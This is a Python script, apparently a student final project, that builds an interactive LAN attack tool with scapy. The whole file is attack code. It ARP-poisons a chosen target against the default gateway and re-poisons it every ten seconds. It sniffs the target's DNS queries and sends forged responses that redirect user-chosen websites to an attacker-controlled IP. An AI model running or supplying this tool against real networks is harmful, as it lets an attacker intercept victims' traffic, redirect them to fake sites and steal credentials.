from scapy.all import *
import netifaces as ni
import search_hosts as sh
import arp_spoofing as arp
import spoofing_tool as spoof
import final_project_code as fpc
import time
import re

regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

REPOISON_TIME = int(10)

# dns_hosts = {
#     b"belot.bg.": "10.0.2.6",
# }

# target_ip = "10.0.2.4"
# ip_to_spoof = "10.0.2.6"

def dns_spoofing():
    conf.verb = 0 # make scapy verbose (no output)

    iface = fpc.get_interface()

    spoof.printf("Searching for active hosts in the subnet...")
    spoof.printf("")
    active_hosts = sh.search_hosts(iface)

    spoof.printf("")
    spoof.printf("Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
    target = fpc.validate_ip(active_hosts, "")

    #spoof.printf("")
    #spoof.printf("Input the IP address of the server out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
    #server = fpc.validate_ip(active_hosts, target["ip"])

    # Get the IP addresses of the default gateways of the selected interface
    gateways = []
    for key, val in ni.gateways()["default"].items():
        if val[1] == iface:
            gateways.append(val)

    dns_hosts = choose_websites(active_hosts)
    
    spoof.printf("")
    spoof.printf("Starting poisoning...", 4)
    # Start ARP poisoning
    my_addresses = sh.get_my_details(iface)
    for gw_ip, gw_iface in gateways:
        arp.one_way_arp_start(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface)

    spoof.printf("Poisoning initiated.", 4)

    dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts)

    # TODO stop arp poisoning

def choose_websites(active_hosts):
    #spoof.clear()
    spoof.printf("Now you can choose which websites to spoof and with what IP where the IP is out of the active hosts("+str(1)+"-"+str(len(active_hosts))+").")
    spoof.printf("You can pick multiple times and stop choosing by pressing 's'.")
    
    dns_hosts = {}
    _iter = 0
    continue1 = True
    continue2 = True

    while continue1 and continue2:
        spoof.printf("Choose website to spoof and its corresponding IP out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
        url, continue1 = input_web(7, "URL: ", _iter, True, active_hosts)
        if continue1:
            ip, continue2  = input_web(7, " IP: ", _iter, False, active_hosts)
        _iter += 1
        if continue1 and continue2:
            dns_hosts[url+"."] = ip
            spoof.printf("Added tuple: (" + url + ", " + ip + ")")

    return dns_hosts


def input_web(i, eend, _iter, isURL, active_hosts):
    res = spoof.inputf(i, eend)
    if res in ["s", "stop"]:
        if _iter < 1:
            spoof.printf("You chould choose at least one (URL, IP) pair!", 2)
            return input_web(i, eend, _iter, isURL, active_hosts)
        else:
            spoof.printf("Websites to spoof chosen.")
            return res, False

    if isURL:
        if not is_URL_valid(res):
            spoof.printf("Invalid URL({})! Try again.".format(res), 2)
            return input_web(i, eend, _iter, isURL, active_hosts)
        else:
            return res, True
    else:
        ip, valid = is_IP_valid(active_hosts, res)
        if not valid:
            spoof.printf("Invalid IP({})! Try again.".format(ip), 2)
            return input_web(i, eend, _iter, isURL, active_hosts)
        else:
            return ip, True

def is_URL_valid(string):
    return re.match(regex, "http://" + string) is not None

def is_IP_valid(active_hosts, ip_address):
    try:
        # check if the ip is part of {active_hosts}
        ip_address = active_hosts[int(ip_address) - 1]["ip"]
        return ip_address, True
    except:
        # check the ip using regular expressions

        match = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip_address)
        if bool(match) is False:
            return ip_address, False

        for part in ip_address.split("."):
            if int(part) < 0 or int(part) > 255:
                return ip_address, False

        return ip_address, True

def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts):
    last_poison_time = time.time() - REPOISON_TIME
    _filter = "udp"

    while True:
        # sniff for 1 packet that adheres to the {_filter}
        sniff(prn=process_udp_pkt(target, iface, dns_hosts), filter=_filter, store=0, count=1, timeout=REPOISON_TIME)   

        # {REPOISON_TIME} seconds have passed => should repoison
        current_time = time.time()
        if current_time - last_poison_time > REPOISON_TIME - 0.5:
            repoison(my_addresses, gateways, target, iface)
            last_poison_time = current_time

def repoison(my_addresses, gateways, target, iface):
    spoof.printf("Repoisoning", 4)
    for gw_ip, gw_iface in gateways:
        arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2)

def process_udp_pkt(target, iface, dns_hosts):
    def process_udp_pkt_inside(pkt): 
        if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
            spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)
            resp_packet = build_dns_response_packet(pkt, dns_hosts[pkt[DNSQR].qname])
            sendp(resp_packet, iface=iface)
        else: 
            pass
            #spoof.printf("Found another packet")
    return process_udp_pkt_inside

def build_dns_response_packet(pkt, malicious_ip):
        eth = Ether(src = pkt[Ether].dst,
                    dst = pkt[Ether].src)

        ip = IP(src = pkt[IP].dst,
                dst = pkt[IP].src)

        udp = UDP(dport = pkt[UDP].sport,
                  sport = pkt[UDP].dport)

        dns = DNS(id = pkt[DNS].id,
                  qd = pkt[DNS].qd,
                  aa = 1,
                  rd = 0,
                  qr = 1,
                  qdcount = 1,
                  ancount = 1,
                  nscount = 0,
                  arcount = 0,
                  ar = DNSRR(
                        rrname = pkt[DNS].qd.qname,
                        type = 'A',
                        ttl = 600,
                        rdata = malicious_ip))

        new_pkt = eth / ip / udp / dns
        return new_pkt

# call main
if __name__=="__main__":
    dns_spoofing()